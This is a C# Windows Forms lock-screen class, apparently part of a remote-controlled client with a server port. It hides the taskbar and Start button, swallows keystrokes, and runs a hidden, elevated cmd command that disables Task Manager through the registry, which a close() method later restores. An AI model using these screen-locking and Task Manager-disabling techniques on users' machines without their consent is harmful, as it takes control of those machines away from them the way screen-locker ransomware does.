using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace client
{
    public partial class LockScreen : Form
    {
        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);

        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        [DllImport("user32.dll")]
        public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

        [DllImport("user32.dll")]
        private static extern int GetDesktopWindow();

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;

        public ClientProgram clientProgram;
        public bool lockMode;
        private const int SERVER_PORT = 9998;

        public LockScreen(ClientProgram x)
        {
            clientProgram = x;
            InitializeComponent();
            lockMode = false;
        }

        private void LockScreen_Load(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Maximized;
            this.TopMost = true;
            this.BackgroundImageLayout = ImageLayout.Stretch;
            this.ControlBox = false;
            this.Cursor = Cursors.No;
            _Hide();
            TaskManager(@"/C REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
        }

        protected static int _Handle
        {
            get
            {
                return FindWindow("Shell_TrayWnd", "");
            }
        }

        protected static int HandleOfStartButton
        {
            get
            {
                int handleOfDesktop = GetDesktopWindow();
                int handleOfStartButton = FindWindowEx(handleOfDesktop, 0, "button", 0);
                return handleOfStartButton;
            }
        }

        public static void _Show()
        {
            ShowWindow(_Handle, SW_SHOW);
            ShowWindow(HandleOfStartButton, SW_SHOW);
        }

        public static void _Hide()
        {
            ShowWindow(_Handle, SW_HIDE);
            ShowWindow(HandleOfStartButton, SW_HIDE);
        }


        public void TaskManager(string cmd)
        {

            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = cmd;
            p.StartInfo.Verb = "runas";
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

            p.Start();
        }

        void gkh_KeyUp(object sender, KeyEventArgs e)
        {
            e.Handled = true;
        }

        void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            e.Handled = true;
        }


        public void close()
        {
            TaskManager(@"/C REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f");
            _Show();
            Close();
        }
    }
}
